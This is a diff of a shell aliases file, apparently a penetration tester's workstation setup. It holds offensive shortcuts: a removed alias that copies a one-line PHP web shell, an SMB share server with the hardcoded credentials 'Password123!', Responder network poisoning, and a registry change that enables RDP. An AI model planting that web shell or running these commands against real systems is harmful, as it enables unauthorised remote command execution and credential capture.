@@ -14,14 +14,9 @@ alias getrdp='echo "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\C
 alias winfast='bash /opt/resources/windows/winfast.sh'
 alias linfast='bash /opt/resources/linux/linfast.sh'
 alias runsmbserv='echo "net use Z: \\\\$(ip a sh dev tun0 | grep -oP "(?:[0-9]{1,3}\.){3}[0-9]{1,3}")\\share /user:root Password123!" | xclip -selection clipboard -quiet && smbserver.py -smb2support share $(pwd) -user root -password Password123! && echo "Commande net use copiée dans le presse-papiers"'
-alias ssh2john='/opt/tools/john/run/ssh2john.py'
-alias scan='python3 /opt/resources/scan.py'
-alias getdns='bash /opt/tools/dnsvalidator/getdns.sh'
 alias cat='glow '
 alias responder='sudo responder -I eth0 -wFb'
-alias phpshell='echo "<?php system(\$_GET[\"cmd\"]); ?>" | xclip -selection clipboard && echo "Shell PHP copié !"'
-alias settarget='/opt/tools/Exegol-history/settarget.sh'
-alias nmapperso='function _nmap_auto(){ /usr/bin/nmap "$@" -oN "$1.txt" && cat "$1.txt" | awk '"'"'{print "- " $0}'"'"' > "$1.md" && rm "$1.txt"; }; _nmap_auto'
+alias settarget='/opt/tools/Exegol-history/env.sh'
 
 
 
